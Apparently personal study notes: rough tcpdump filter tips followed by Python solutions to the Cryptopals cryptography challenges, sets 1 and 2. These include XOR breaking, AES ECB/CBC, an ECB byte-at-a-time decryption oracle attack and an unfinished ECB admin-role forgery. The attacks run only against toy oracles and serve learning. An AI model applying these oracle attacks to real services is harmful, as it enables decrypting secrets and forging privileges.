 aLSO ge generate and execute 
 
   
   
   
   wireshakr 
   use 
   net 10.11.1.0/24
    as filter example 
	
 
 
tcpdump 
-r to open the file 
  
 -n skip dns lookup 
 -r read 
 filter 
 awk -F "" '{print $3}' | sort | uniq -c | head 
 
 
 -n src host 172.168.24.53
 
 for filtering originating from a certain hosts 
 
 
 and also same with dst 
 
 -n dst host 172.16.42.10
 
 same with 
 -p port 
 
 
-X  for dumping in Hex and ascii format (both )



Advanced Header Filtering  
--------------------------------
ACK 
AND PUSH 
flags turned on 
14th byte 
4 th and 5th byte 


 turning on only this both would give us decimal 24
 
  
-A ascii print


' tcp[13] = 24'  -r password_d_cracking 
   
   
   ----------------------------------------------------------------------------------
   

encode URI Component doesnt escape 

  A-Z a-z 0-9 - _ . ! ~ * ' ( )

------------------------------------------------------------------------------------------------------------
Cryptopals 
----------------------
challenges 
---------------------------
b64_index_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


def b64_encode(input_bytes):
    """Implements base64 encoding.
    """
    # Initialize variable that will store the base64 encoded string
    encoded_output = ''

    # Takes each input character and converts to binary, eventually creating
    # a list of ones and zeroes (1, 1, 1, 0, 0, 1, 1, 0)
    bit_list = list(''.join([bin(byte)[2:].zfill(8) for byte in input_bytes]))
    
    # Break the list smaller lists, 6 bits long. For example, [1,1,1,1,1,1,0,0]
    # becomes [[1,1,1,1,1,1] [0,0]]
    chunks = [bit_list[i:i+6] for i in range(0, len(bit_list), 6)]
    
    for chunk in chunks:
        # Joins the chunk so it can be converted to an integer
        chunk = ''.join(chunk)

        # Checks the length of the chunk, adding trailing zeroes, mapping the
        # value to the b64_index_table, and adding '=' characters as necessary.
        if len(chunk) == 2:
            if '1' in chunk:
                chunk += '0000'
                encoded_output += b64_index_table[int(chunk, 2)] + '=='
            else:
                encoded_output += '=='
        elif len(chunk) == 4: 
            if '1' in chunk:
                chunk += '00'
                encoded_output += b64_index_table[int(chunk, 2)] + '='
            else:
                encoded_output += '='
        elif len(chunk) == 6:
            encoded_output += b64_index_table[int(chunk, 2)]
    return encoded_output


def main():
    string = '49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d'
    byte_string = bytes.fromhex(string)
    print(b64_encode(byte_string))


if __name__ == '__main__':
    main()
	
	--------------------------------------------------------------------------
	challenges 3
	-------------------
	def get_english_score(input_bytes):
    """Compares each input byte to a character frequency 
    chart and returns the score of a message based on the
    relative frequency the characters occur in the English
    language
    """

    # From https://en.wikipedia.org/wiki/Letter_frequency
    # with the exception of ' ', which I estimated.
    character_frequencies = {
        'a': .08167, 'b': .01492, 'c': .02782, 'd': .04253,
        'e': .12702, 'f': .02228, 'g': .02015, 'h': .06094,
        'i': .06094, 'j': .00153, 'k': .00772, 'l': .04025,
        'm': .02406, 'n': .06749, 'o': .07507, 'p': .01929,
        'q': .00095, 'r': .05987, 's': .06327, 't': .09056,
        'u': .02758, 'v': .00978, 'w': .02360, 'x': .00150,
        'y': .01974, 'z': .00074, ' ': .13000
    }
    return sum([character_frequencies.get(chr(byte), 0) for byte in input_bytes.lower()])


def single_char_xor(input_bytes, char_value):
    """Returns the result of each byte being XOR'd with a single value.
    """
    output_bytes = b''
    for byte in input_bytes:
        output_bytes += bytes([byte ^ char_value])
    return output_bytes


def main():
    hexstring = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'
    ciphertext = bytes.fromhex(hexstring)
    potential_messages = []
    for key_value in range(256):
        message = single_char_xor(ciphertext, key_value)
        score = get_english_score(message)
        data = {
            'message': message,
            'score': score,
            'key': key_value
            }
        potential_messages.append(data)
    best_score = sorted(potential_messages, key=lambda x: x['score'], reverse=True)[0]
    for item in best_score:
        print("{}: {}".format(item.title(), best_score[item]))

if __name__ == '__main__':
    main()
	
	------------------------------------------------------------------------------
	challenge 4
	------------------
	def get_english_score(input_bytes):
    """Compares each input byte to a character frequency 
    chart and returns the score of a message based on the
    relative frequency the characters occur in the English
    language.
    """

    # From https://en.wikipedia.org/wiki/Letter_frequency
    # with the exception of ' ', which I estimated.
    character_frequencies = {
        'a': .08167, 'b': .01492, 'c': .02782, 'd': .04253,
        'e': .12702, 'f': .02228, 'g': .02015, 'h': .06094,
        'i': .06094, 'j': .00153, 'k': .00772, 'l': .04025,
        'm': .02406, 'n': .06749, 'o': .07507, 'p': .01929,
        'q': .00095, 'r': .05987, 's': .06327, 't': .09056,
        'u': .02758, 'v': .00978, 'w': .02360, 'x': .00150,
        'y': .01974, 'z': .00074, ' ': .13000
    }
    return sum([character_frequencies.get(chr(byte), 0) for byte in input_bytes.lower()])


def single_char_xor(input_bytes, char_value):
    """Returns the result of each byte being XOR'd with a single value.
    """
    output_bytes = b''
    for byte in input_bytes:
        output_bytes += bytes([byte ^ char_value])
    return output_bytes


def bruteforce_single_char_xor(ciphertext):
    """Performs a singlechar xor for each possible value(0,255), and
    assigns a score based on character frequency. Returns the result
    with the highest score.
    """
    potential_messages = []
    for key_value in range(256):
        message = single_char_xor(ciphertext, key_value)
        score = get_english_score(message)
        data = {
            'message': message,
            'score': score,
            'key': key_value
            }
        potential_messages.append(data)
    return sorted(potential_messages, key=lambda x: x['score'], reverse=True)[0]


def main():
    ciphers = open('set_1_exer_4.txt').read().splitlines()
    potential_plaintext = []
    for hexstring in ciphers:
        ciphertext = bytes.fromhex(hexstring)
        potential_plaintext.append(bruteforce_single_char_xor(ciphertext))
    best_score = sorted(potential_plaintext, key=lambda x: x['score'], reverse=True)[0]
    for item in best_score:
        print("{}: {}".format(item.title(), best_score[item]))
        

if __name__ == '__main__':
    main()
	----------------------------------
	challenge 6
	-----------------
	import base64


def get_english_score(input_bytes):
    """Compares each input byte to a character frequency 
    chart and returns the score of a message based on the
    relative frequency the characters occur in the English
    language.
    """

    # From https://en.wikipedia.org/wiki/Letter_frequency
    # with the exception of ' ', which I estimated.
    character_frequencies = {
        'a': .08167, 'b': .01492, 'c': .02782, 'd': .04253,
        'e': .12702, 'f': .02228, 'g': .02015, 'h': .06094,
        'i': .06094, 'j': .00153, 'k': .00772, 'l': .04025,
        'm': .02406, 'n': .06749, 'o': .07507, 'p': .01929,
        'q': .00095, 'r': .05987, 's': .06327, 't': .09056,
        'u': .02758, 'v': .00978, 'w': .02360, 'x': .00150,
        'y': .01974, 'z': .00074, ' ': .13000
    }
    return sum([character_frequencies.get(chr(byte), 0) for byte in input_bytes.lower()])


def single_char_xor(input_bytes, char_value):
    """Returns the result of each byte being XOR'd with a single value.
    """
    output_bytes = b''
    for byte in input_bytes:
        output_bytes += bytes([byte ^ char_value])
    return output_bytes


def bruteforce_single_char_xor(ciphertext):
    """Performs a singlechar xor for each possible value(0,255), and
    assigns a score based on character frequency. Returns the result
    with the highest score.
    """
    potential_messages = []
    for key_value in range(256):
        message = single_char_xor(ciphertext, key_value)
        score = get_english_score(message)
        data = {
            'message': message,
            'score': score,
            'key': key_value
            }
        potential_messages.append(data)
    return sorted(potential_messages, key=lambda x: x['score'], reverse=True)[0]


def break_repeating_key_xor(ciphertext):
    """Attempts to break repeating-key XOR encryption.
    """
    average_distances = []

    # Take the keysize from suggested range 
    for keysize in range(2,41):

        # Initialize list to store Hamming distances for this keysize 
        distances = []

        # Break the ciphertext into chunks the length of the keysize
        chunks = [ciphertext[i:i+keysize] for i in range(0, len(ciphertext), keysize)]
        
        while True:
            try:
                # Take the two chunks at the beginning of the list and 
                # get the Hamming distance 
                chunk_1 = chunks[0]
                chunk_2 = chunks[1]
                distance = calculate_hamming_distance(chunk_1, chunk_2)

                # Normalize this result by dividing by KEYSIZE
                distances.append(distance/keysize)

                # Remove these chunks so when the loop starts over, the
                # Hamming distance for the next two chunks can be calculated
                del chunks[0]
                del chunks[1]

            # When an exception occurs (indicating all chunks have 
            # been processed) break out of the loop.
            except Exception as e:
                break
        result = {
            'key': keysize,
            'avg distance': sum(distances) / len(distances)
            }
        average_distances.append(result)
    possible_key_lengths = sorted(average_distances, key=lambda x: x['avg distance'])[0]
    possible_plaintext = []

    # Will populate with a single character as each transposed 
    # block has been single-byte XOR brute forced
    key = b''
    possible_key_length = possible_key_lengths['key']
    for i in range(possible_key_length):
        
        # Creates an block made up of each nth byte, where n
        # is the keysize
        block = b''
        for j in range(i, len(ciphertext), possible_key_length):
            block += bytes([ciphertext[j]])
        key += bytes([bruteforce_single_char_xor(block)['key']]) 
    possible_plaintext.append((repeating_key_xor(ciphertext, key), key)) 
    return max(possible_plaintext, key=lambda x: get_english_score(x[0]))


def repeating_key_xor(message_bytes, key):
    """Returns message XOR'd with a key. If the message, is longer
    than the key, the key will repeat.
    """
    output_bytes = b''
    index = 0
    for byte in message_bytes:
        output_bytes += bytes([byte ^ key[index]])
        if (index + 1) == len(key):
            index = 0
        else:
            index += 1
    return output_bytes


def calculate_hamming_distance(input_bytes_1, input_bytes_2):
    """Finds and returns the Hamming distance (number of differing 
    bits) between two byte-strings
    """
    hamming_distance = 0
    for b1, b2 in zip(input_bytes_1, input_bytes_2):
        difference = b1 ^ b2

        # Count the number of differences ('1's) and add to the hamming distance
        hamming_distance += sum([1 for bit in bin(difference) if bit == '1'])
    return hamming_distance


def main():
    with open('6.txt') as input_file:
        ciphertext = base64.b64decode(input_file.read())
    result, key = break_repeating_key_xor(ciphertext)
    print("Key: {}\nMessage: {}".format(key, result))


if __name__ == '__main__':
    main()
	-----------------------------------
	challenge 7
	-------------------
	    openssl enc -aes-128-ecb -d -a -in secret.txt -K $(echo "YELLOW SUBMARINE" | xxd -p) -iv 1 | head
    
	
	---------------------------
	challenge 8 
	------------------
	 #include "crypto.h"

    int main()
    {
        CryptoLib crypt;

        string str;

        ifstream infile;
        infile.open("8.txt");

        int count = 0;
        while(!infile.eof())
        {
            getline(infile, str);

            //Check if this string has ECB mode
            if(crypt.detect_ecb_mode(str, 16) == true)
            {
                cout << "FOUND AT LINE " << count << " => " << str << endl;
                break;
            }
            count++;
        }
    }
	--------------------------------------------------------
	SET 2
	-------------
	challenge 9
	--------------------
	def pkcs7_pad(s, length):
    """
    Returns a PKCS#7-padded string of length @length. It pads a string to the
    nearest multiple of @length (rounded up) with each padded byte having the
    value equal to the total number of padded bytes added.
    @param s [str]: Input ASCII string
    @param length [int]: Desired length of padded string
    @returns [str]: Padded string
    """

    pad = length - len(s) % length
    return s + chr(pad) * pad

if __name__=='__main__':
    padded_msg = pkcs7_pad('YELLOW SUBMARINE', 20)
    print len(padded_msg), padded_msg, padded_msg.encode('hex')
	
	
	-------------------------------------------------
	challenge 10 
	--------------------------
	import binascii
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from challenge9 import pkcs7_pad

def b642hex(s):
    """
    FROM: set1/challenge6
    """
    return binascii.hexlify(binascii.a2b_base64(s))

def hex2b64(s):
    """
    FROM: set1/challenge6
    """
    return binascii.b2a_base64(binascii.unhexlify(s))

def xorstr(s1, s2):
    """
    Performs a character-wise XOR for each character in strings @s1 and @s2.
    Assume that s1 and s2 are of equal length.
    @param s1, s2 [str]: ASCII strings
    @returns [str]: ASCII string
    """

    def xor(c1, c2):
        """
        @param c1, c2 [str]: Single byte ASCII characters
        @returns [str]: Single byte ASCII character
        """
        return chr(ord(c1) ^ ord(c2))

    return ''.join([xor(s1[i], s2[i]) for i in range(len(s1))])

def aes_ecb_encrypt(k, pt):
    """
    Encrypts a message using AES in ECB mode. Pads as necessary using PKCS#7.
    @param k [str]: key
    @param pt [str]: PT (ASCII string)
    @returns [str]: CT (ASCII string)
    """

    padded_pt = pkcs7_pad(pt, len(k))
    cipher = Cipher(algorithms.AES(k), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded_pt) + encryptor.finalize()

def aes_ecb_decrypt(k, ct):
    """
    FROM: set1/challenge7
    Decrypts a message encrypted using AES in ECB mode.
    @param k [str]: key
    @param ct [str]: CT (ASCII string)
    @returns [str]: PT (ASCII string)
    """

    cipher = Cipher(algorithms.AES(k), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()

def aes_cbc_encrypt(k, pt, iv):
    """
    Encrypts a message using AES in CBC mode. Pads as necessary using PKCS#7.
    @param k [str]: ASCII key
    @param pt [str]: ASCII PT string
    @param iv [str]: Initialization vector
    @returns [str]: ASCII CT string
    """

    def ecb_encrypt(k, pt):
        """
        Encrypts a message using AES in ECB mode (assume the input is padded to
        the block size).
        """
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(pt) + encryptor.finalize()

    padded_pt = pkcs7_pad(pt, len(k))
    pt_list = [padded_pt[i:i+len(k)] for i in range(0, len(padded_pt), len(k))]
    ct_list = [iv]
    for i in range(len(pt_list)):
        ct_list.append(ecb_encrypt(k, xorstr(ct_list[-1], pt_list[i])))
    return ''.join(ct_list[1:]) # Remove the IV

def aes_cbc_decrypt(k, ct, iv):
    """
    Decrypts a message encrypted using AES in CBC mode.
    @param k [str]: ASCII key
    @param ct [str]: ASCII CT string
    @param iv [str]: Initialization vector
    @returns [str]: ASCII PT string
    """

    def ecb_decrypt(k, ct):
        """
        FROM: set1/challenge7
        Decrypts a message encrypted using AES in ECB mode (assume the input is
        padded to the block size).
        """
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()

    ct_list = [iv]
    ct_list += [ct[i:i+len(k)] for i in range(0, len(ct), len(k))]
    pt_list = [xorstr(ecb_decrypt(k, ct_list[i+1]), ct_list[i])
               for i in range(len(ct_list)-1)]
    return ''.join(pt_list)

if __name__=='__main__':
    key = 'YELLOW SUBMARINE'
    with open('challenge10.txt', 'r') as f:
        txt = b642hex(''.join([line.strip() for line in f])).decode('hex')
    iv = chr(0) * len(key)
    print aes_cbc_decrypt(key, txt, iv)
    print hex2b64(aes_cbc_encrypt(
        key, aes_cbc_decrypt(key, txt, iv), iv
    ).encode('hex'))
	-------------------------------------------------------------
	challenge 11
	----------------------
	import random
from challenge10 import aes_ecb_encrypt, aes_cbc_encrypt

def rand_bytes(strlen):
    """
    Returns a string of @strlen random bytes.
    """
    return ''.join(map(chr,
                       [random.randint(0, 255) for _ in range(strlen)]))

def rand_bytes_range(minlen, maxlen):
    """
    Generates a random string of a random number of bytes from @minlen to
    @maxlen. The distribution of possible strings is uniform.
    """
    return rand_bytes(random.randint(minlen, maxlen))

def encryption_oracle(pt):
    """
    For the input @pt, pads it with 5-10 bytes on both sides, then encrypts it
    with either AES in ECB mode or AES in CBC mode with equal probability. The
    key and IV are randomly generated 16-byte strings.
    """

    key = rand_bytes(16)
    iv = rand_bytes(16) # In case the mode is CBC. Generate this before
                        # choosing the mode to protect against timing attacks.
    padded_pt = rand_bytes_range(5, 10) + pt + rand_bytes_range(5, 10)
    if random.randint(0, 1) == 0:
        # print True # Uncomment to check the oracle detector
        return aes_ecb_encrypt(key, padded_pt)
    else:
        # print False # Uncomment to check the oracle detector
        return aes_cbc_encrypt(key, padded_pt, iv)

def detect_encryption_oracle():
    """
    Calls an encryption oracle (some function that encrypts a plaintext) and
    returns True if the encryption mode was ECB and False if the encryption
    mode was CBC. This particular encryption oracle is described above. Since
    the blocksize of the encryption oracle is 16 bytes, the strategy is to feed
    it a 48-byte string with 16-byte repetitions
    (s[0..15] == s[16..31] == s[32..47]). Though the oracle pads the beginning
    and end of the string (the first block will be pseudorandom), it is
    guaranteed that the second and the third block will equal in ECB mode (and
    improbable that they will in CBC mode).
    """

    pt = 'YELLOW SUBMARINE' * 3
    ct = encryption_oracle(pt)
    return ct[16:32] == ct[32:48]

if __name__=='__main__':
    print detect_encryption_oracle()
	----------------------------------------------
	challenge 12 
	---------------------
	from challenge10 import b642hex, aes_ecb_encrypt
from challenge11 import rand_bytes

def is_ascii(char):
    """
    @param char [str]: ASCII character
    @returns True if @char is a valid ASCII character and False otherwise
    """
    return ord(char) not in set([128] + [153] + range(161, 255) + range(0, 9) +
                                range(11, 32) + [127] + range(129, 153) +
                                range(154, 161))

class SessionOracle:
    """
    Encrypts input PTs with AES 128 in ECB mode using a session key and padding
    the PT with a secret string. Our goal is to figure out the secret string
    with repeated calls to the oracle.
    """

    __SECRET_STRING = (
        'Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkg'
        'aGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBq'
        'dXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUg'
        'YnkK'
    )

    def __init__(self):
        self.__key = rand_bytes(16) # Establish a random 16-byte key for the
                                    # length of this "session"

    def encrypt(self, pt):
        """
        Returns E_k(pt || SECRET_STRING) where E_k is AES 128 in ECB mode and
        || is the concatenation operator. The same key k is used for the entire
        session.
        @param pt [str]: ASCII PT
        @returns [str]: ASCII CT
        """

        padded_pt = pt + b642hex(self.__SECRET_STRING).decode('hex')
        return aes_ecb_encrypt(self.__key, padded_pt)

def decrypt_session_secret():
    """
    Decrypt an AES 128 ECB mode oracle with a session key and PKCS#7 padding
    with the following steps:
        1. Find out the blocksize and make sure the oracle is in ECB mode.
           (see get_blocksize())
        2. Get the unpadded length of the session message.
           (see get_msg_length())
        3. Decode the session message by checking payload messages of the form
           P || M || Y where P is a prefix of the desired length, M is the
           first |M| known bytes of the message, and Y is the character we
           think might be the next character of the message. We check this
           against the results of sending the payload P at the index of Y. If
           the bytes match, we might have found a hit. Since multiple bytes can
           match here, we use a recursive strategy to find the entire string.
           (see decode())
    """

    def get_blocksize(maxlen=1024):
        """
        Returns the blocksize of the oracle. Continually add one byte of
        padding until, for an input message of length M, the first M/2 bytes of
        the output message are equal to the second M/2 bytes. This also checks
        that the oracle is using ECB mode. If no repetition is found up to a
        large maximum length, then assume that ECB mode is not being used.
        @returns [int]: Blocksize of the ECB mode cipher or False if no
                        blocksize is found (this implies that ECB mode is not
                        set).
        """

        paddedlen = len(oracle.encrypt(''))
        padbytes = 1
        while (oracle.encrypt('A' * padbytes)[:padbytes/2]
               != oracle.encrypt('A' * padbytes)[padbytes/2:padbytes]):
            if padbytes > maxlen:
                return False
            padbytes += 1
        return padbytes / 2

    def get_msg_length():
        """
        Returns the non-padded length of the secret message. The way to do this
        is to find the length of the padded message and subtract the number of
        bytes of padding. The number of bytes of padding can be found by
        continually adding one byte of padding until the length of the returned
        message changes (it will increase by blocksize).
        @returns [int]: Non-padded length of the secret message.
        """

        paddedlen = len(oracle.encrypt(''))
        for i in range(1, blocksize+1): # 1 pad is required where msglen %
                                        # blocksize is 0
                                        # blocksize pads are required where
                                        # msglen % blocksize is 1
            if paddedlen != len(oracle.encrypt('A' * i)):
                return paddedlen - i + 1

    def next_byte(padlen, blockidx, msg):
        """
        Sends the following payloads to the oracle:
            'A'*@padlen || @msg || Y, where Y is a char from 0x00 to 0xff
            'A'*@padlen, the target payload
        Assuming @msg is correct (is equal to the first |@msg| bytes of the
        secret message), the first |'A'*@padlen| + |@msg| bytes of all payloads
        (including the target payload) should be the same, and the next byte
        should be compared. Note that |'A'*@padlen| + |@msg| + 1 should be a
        multiple of the blocksize because we want to check the equality of full
        blocks. The next character is the Y where the CT of the first
        |'A'*@padlen| + |@msg| + 1 bytes are equal to the same first bytes of
        CT from the target payload. Since each PT uniquely maps to a CT, there
        can only be one correct Y. And there must be at least one correct Y
        because the domain of Y spans the set of all possible characters.
        Return Y.
        @param padlen [int]: Length of the payload.
        @param blockidx [int]: The block the target byte is in.
        @param msg [str]: Current known message.
        @returns [str]: Next character in the message.
        """

        payload_prefix = 'A' * padlen
        blockcmp = blocksize * (blockidx + 1)
        # Mapping of { ptbyte: ct[:blockcmp] } for all pt bytes [int] in
        # (0, 255).
        ct_mapping = [oracle.encrypt(payload_prefix + msg + chr(c))[:blockcmp]
                      for c in range(256)]
        target_str = oracle.encrypt(payload_prefix)[:blockcmp]
        possibilities = [chr(i) for i, ctprefix in enumerate(ct_mapping)
                         if ctprefix == target_str][0] # Should always be
                                                       # of length 1
        return possibilities

    def decode():
        """
        Decodes the secret message by finding successive bytes of the message
        blockwise. To find the first byte, the padding starts at blocksize - 1
        and decreases until the first entire block is found. Then the process
        repeats for successive blocks until the entire message is found.
        @returns [str]: The decoded oracle secret message.
        """

        msg = ''
        padlen = blocksize - 1
        blockidx = 0
        while len(msg) < msglen:
            if padlen == 0:
                padlen = blocksize
                blockidx += 1
            msg += next_byte(padlen, blockidx, msg)
            padlen -= 1
        return msg

    oracle = SessionOracle()
    blocksize = get_blocksize()
    msglen = get_msg_length()
    return decode()

if __name__=='__main__':
    print decrypt_session_secret()
	--------------------------------------------
	challenge 13 
	--------------------
	from challenge10 import aes_ecb_encrypt, aes_ecb_decrypt
from challenge11 import rand_bytes

class SessionOracle:
    """
    Encrypts input PTs with AES 128 in ECB mode using a session key.
    """

    def __init__(self):
        self.__key = rand_bytes(16) # Establish a random 16-byte key for the
                                    # length of this "session"

    def encrypt(self, pt):
        return aes_ecb_encrypt(self.__key, pt)

    def decrypt(self, ct):
        return aes_ecb_decrypt(self.__key, ct)

def paramstr_to_obj(paramstr):
    obj = {}
    for param in paramstr.split('&'):
        k, v = param.split('=')
        obj[k] = v
    return obj

def profile_for(email):
    obj = {
        'email': email,
        'uid': 10,
        'role': 'user'
    }
    return '&'.join(['%s=%s' % (k, v) for k, v in obj.iteritems()])

def make_user_admin(email):
    """
    Construct the modified encrypted CT corresponding to the url encoded
    paramstr email=[email]&uid=10&role=admin using only calls to the oracle
    (calls to aes_ecb_encrypt with the same session key).
    @param email [str]: The email used to generate the url encoded string
                  email=[email]&uid=10&role=user
    @returns [str]: An encrypted CT that when decrypted returns the url encoded
                    string email=[email]&uid=10&role=admin
    """

    def get_blocksize(maxlen=1024):
        """
        Returns the blocksize of the oracle. Continually add one byte of
        padding until, for an input message of length M, the first M/2 bytes of
        the output message are equal to the second M/2 bytes. This also checks
        that the oracle is using ECB mode. If no repetition is found up to a
        large maximum length, then assume that ECB mode is not being used.
        @returns [int]: Blocksize of the ECB mode cipher or False if no
                        blocksize is found (this implies that ECB mode is not
                        set).
        """

        paddedlen = len(oracle.encrypt(''))
        padbytes = 1
        while (oracle.encrypt('A' * padbytes)[:padbytes/2]
               != oracle.encrypt('A' * padbytes)[padbytes/2:padbytes]):
            if padbytes > maxlen:
                return False
            padbytes += 1
        return padbytes / 2

    oracle = SessionOracle()
    # Make sure it's working
    encrypted_profile = oracle.encrypt(profile_for(email))
    decrypted_profile = oracle.decrypt(encrypted_profile)
    print encrypted_profile.encode('hex')
    print decrypted_profile

    # Now, only using @email and @encrypted_profile, make a role=admin profile.
    blocksize = get_blocksize()
    return

if __name__=='__main__':
    make_user_admin('foo@bar.com')
	--------------------------------------------------------
	challenge 14 
	--------------------
	from challenge10 import b642hex, aes_ecb_encrypt
from challenge11 import rand_bytes, rand_bytes_range

class SessionOracle:
    """
    Encrypts input PTs with AES 128 in ECB mode using a session key and padding
    the PT with a secret string. Our goal is to figure out the secret string
    with repeated calls to the oracle.
    """

    __SECRET_STRING = (
        'Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkg'
        'aGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBq'
        'dXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUg'
        'YnkK'
    )

    def __init__(self):
        self.__key = rand_bytes(16) # Establish a random 16-byte key for the
                                    # length of this "session"
        self.__randprefix = rand_bytes_range(0, 255) # Add to the front of
                                                     # every PT

    def encrypt(self, pt):
        """
        Returns E_k(randprefix || pt || SECRET_STRING) where E_k is AES 128 in
        ECB mode and || is the concatenation operator. The same key k is used
        for the entire session.
        @param pt [str]: ASCII PT
        @returns [str]: ASCII CT
        """

        padded_pt = (self.__randprefix + pt
                     + b642hex(self.__SECRET_STRING).decode('hex'))
        return aes_ecb_encrypt(self.__key, padded_pt)

def decrypt_session_secret():

    def get_blocksize():
        """
        Returns the blocksize of the oracle. Continually add one byte of
        padding until the size of the returned CT changes. The difference in
        the CT lengths is the blocksize.
        @returns [int]: Blocksize of the ECB mode cipher.
        """

        paddedlen = len(oracle.encrypt(''))
        padbytes = 0
        while len(oracle.encrypt('A' * padbytes)) == paddedlen:
            padbytes += 1
        return len(oracle.encrypt('A' * padbytes)) - paddedlen

    def get_msg_length():
        """
        Returns the non-padded length of the secret message. The way to do this
        is to find the length of the padded message and subtract the number of
        bytes of padding. The number of bytes of padding can be found by
        continually adding one byte of padding until the length of the returned
        message changes (it will increase by blocksize).
        @returns [int]: Non-padded length of the secret message.
        """

        paddedlen = len(oracle.encrypt(''))
        for i in range(1, blocksize+1): # 1 pad is required where msglen %
                                        # blocksize is 0
                                        # blocksize pads are required where
                                        # msglen % blocksize is 1
            if paddedlen != len(oracle.encrypt('A' * i)):
                return paddedlen - i + 1

    def get_prefix_offset():
        """
        Finds the amount of padding the input PT must be offset by by
        continually adding one byte of padding and calling the oracle until a
        repetition is produced. Returns the number of padding bytes that must
        be added and the starting index of the block-aligned message.
        @returns [tuple]: ([int], [int]), where t[0] is the length of padding
                          that must be prepended to block-align the message and
                          t[1] is the index of the beginning of the message
                          with that padding.
        """

        def block_repetition(s):
            """
            Returns True if there is a block reptition in a string:
            |A...A|B...B|...|R...R|R...R|S...S|, the block |R...R| is repeated.
            @returns [tuple]: ([bool], [int]), Returns (True, i) where i is the
                              index of the first character of the block
                              following the repetition if a repetition is
                              found. Returns (False, -1) otherwise.
            """

            for i in range(0, len(s)-blocksize, blocksize):
                if s[i:i+blocksize] == s[i+blocksize:i+2*blocksize]:
                    return (True, i + 2*blocksize)
            return (False, -1)

        padlen = 0
        repetition, index = block_repetition(oracle.encrypt('A' * padlen))
        while not repetition:
            padlen += 1
            repetition, index = block_repetition(oracle.encrypt('A' * padlen))
        return (padlen, index)

    def get_msg_length():
        """
        This is slightly more complicated than the same function in challenge
        12 but the idea is the same. Keep adding padding bytes until the CT
        length changes. This is the length of padding added to the PT. Subtract
        that from the length of the returned CT. In this case, we start with a
        padded, block-aligned message:
        |R...R| ... |RRRPPPPP|PPPPPPPP|PPPPPPPP|M...M|MMMppppp| where p are
        padding bytes. We want to find the number of p. So, add Q:
        |R...R| ... |RRRPPPPP|PPPPPPPP|PPPPPPPP|QQQQQQMM|M...M|MMMMMMMM|M
        until the size of the CT changes. The number of p in the original
        message is equal to the number of extra padding bytes |Q| - 1. The
        length of the message is given by:
        |msg| - (|R| + |P|) - (|Q| - 1)
        @returns [int]: The length of the secret message.
        """

        paddedlen = len(oracle.encrypt('A' * pad_prefixlen))
        for i in range(1, blocksize+1): # 1 pad is required where msglen %
                                        # blocksize is 0
                                        # blocksize pads are required where
                                        # msglen % blocksize is 1
            if paddedlen != len(oracle.encrypt('A' * (pad_prefixlen + i))):
                return paddedlen - msg_offset - (i - 1)

    def next_byte(padlen, blockidx, msg):
        """
        See the name function in challenge 12 for better documentation. The two
        differences are:
            1. Offset the oracle input by an addition prefix padding (found
               previously) to block-align the message.
            2. Offset the comparison indices to start at the index of the
               first character of the block-aligned message.
        @param padlen [int]: Length of the payload. This needs to be offset by
                             the number of bytes of extra padding required to
                             block-align the message.
        @param blockidx [int]: The block of the message the target byte is in.
                               This needs to be offset by the blocks taking up
                               by the prefix and extra padding.
        @param msg [str]: Current known message.
        @returns [list]: List of possible ASCII characters that the next
                         character in the message could be.
        """

        blockcmp = blocksize * (blockidx + 1)
        target_msg = oracle.encrypt('A' * (pad_prefixlen + padlen))
        ct_mapping = [oracle.encrypt('A' * (pad_prefixlen + padlen) + msg + c)
                      for c in map(chr, range(0, 255))]
        next_byte = [chr(i) for i, ct in enumerate(ct_mapping)
                     if (ct[msg_offset:msg_offset+blockcmp]
                         == target_msg[msg_offset:msg_offset+blockcmp])][0]
        return next_byte

    def decode():
        """
        Strategy:
            Suppose the oracle has the following message PT (blocksize of 8).
            R...R| ... |RRRMMMMM| ... | M...M
            We want to continually add bytes of padding until this happens:
            R...R| ... |RRRPPPPP|PPPPPPPP|PPPPPPPP|M...M
            We detect when this happens as the smallest length of padding P
            such that there is a repitition among blocks. Then, the problem
            reduces the problem solved in challenge 12 with two caveats:
                1. The current block index blockidx is offset by the index of
                   the block immediately following the repeated blocks.
                2. In all calls to the oracle, you must prepend an extra |P|
                   bytes to the PT, where |P| is the length of the smallest
                   padding P required to cause a repetition.
        """

        msg = ''
        padlen = blocksize - 1
        blockidx = 0
        while len(msg) < msglen:
            if padlen == 0:
                padlen = blocksize
                blockidx += 1
            msg += next_byte(padlen, blockidx, msg)
            padlen -= 1
        return msg

    oracle = SessionOracle()
    blocksize = get_blocksize()
    pad_prefixlen, msg_offset = get_prefix_offset()
    msglen = get_msg_length()
    return decode()

if __name__=='__main__':
    print decrypt_session_secret()
	-------------------------------------------
	challenge 15 
	-----------------
	def valid_pkcs7_padding(s):
    """
    Determine if a string has valid PKCS#7 padding. Do this by examining the
    last N bytes where N is the ordinal of the last byte of the input and make
    sure that the last N bytes are N
    @param s [str]: Input string
    @returns [bool]: True if the string is correctly padded, raises an
                     Exception otherwise
    """

    last = ord(s[-1])
    if len(set(map(ord, s[-last:]))) == 1:
        return True
    else:
        raise Exception('Not a valid PKCS#7 encoding for string %s' % s)

if __name__=='__main__':
    print valid_pkcs7_padding("ICE ICE BABY\x04\x04\x04\x04")
    print valid_pkcs7_padding("ICE ICE BABY\x05\x05\x05\x05")
